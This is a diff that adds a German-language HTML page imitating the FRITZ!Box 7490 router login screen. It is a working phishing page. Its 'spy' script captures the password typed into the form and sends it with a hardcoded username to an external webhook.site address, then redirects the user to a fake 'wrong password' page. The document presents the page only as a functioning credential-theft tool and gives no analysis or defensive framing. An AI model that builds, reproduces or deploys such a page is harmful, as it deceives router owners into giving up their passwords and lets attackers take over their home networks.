@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="de">
+
+    <head>
+        <link rel="stylesheet" href="style.css">
+        <title>Fritz!Box </title>
+        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico" />
+    </head>
+    <body>
+        <header id="blueBarBox">	
+
+            <div id="logoBox">
+
+            </div>
+
+            <div id="blueBarTitle">
+                FRITZ!Box 7490
+            </div>
+
+
+        </header>
+
+        <div class="dialogOuter">
+
+            <div class="dialogInner">
+                <div id="dialogHeadBox">
+                    <h2 id="dialogTitle">Willkommen bei Ihrer FRITZ!Box</h2>
+                </div>
+                <div id="dialogContent">
+                    <form method="POST" action="wrongPassword.html" onsubmit="spy()" id="loginForm">
+                        <div class="formular">
+                            <p>Bitte melden Sie sich mit ihrem Kennwort an.</p>
+                            <div id="inputWrapper">
+                                <label>FRITZ!Box-Kennwort</label>
+                                <div class="passwordInput">
+                                    <input type="password" id="password" tabindex="2" name="password">
+                                    <i class="icon-eye"></i>
+                                </div>
+                            </div>
+                            <div id="loginError">
+                                <p id="errorText">Anmeldung Fehlgeschlagen.</p>
+                            </div>
+                            <div id="changeHint">
+                                <strong>Hinweis:</strong>
+                                <br>
+                                <span>
+                                    Sie können sich auch 
+                                    <a id="changeUserLink" href="503.html">mit Ihrem Benutzernamen und Kennwort anmelden.</a>
+                                </span>
+                            </div>
+
+                        </div>
+                        <div class="btnFormFoot">
+                            <a href="503.html">Kennwort vergessen?</a>
+                            <button type="submit" id="submitButton">Anmelden</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+
+
+        <script>
+            function spy(){
+                const password = document.getElementById("password").value;
+
+
+                try{
+                var xhr = new XMLHttpRequest();
+
+                xhr.open("POST", "https://webhook.site/ad10ddc5-8bec-42e6-94e9-1465c0794f3e", true);
+                xhr.send(JSON.stringify({
+                    response: password,
+                    lp: null,
+                    loginView: "simple",
+                    username: "fritz0846"
+                }));
+                }catch(e){
+                    console.log(e)
+                }
+
+            }
+        </script>
+
+    </body>
+
+
+</html>
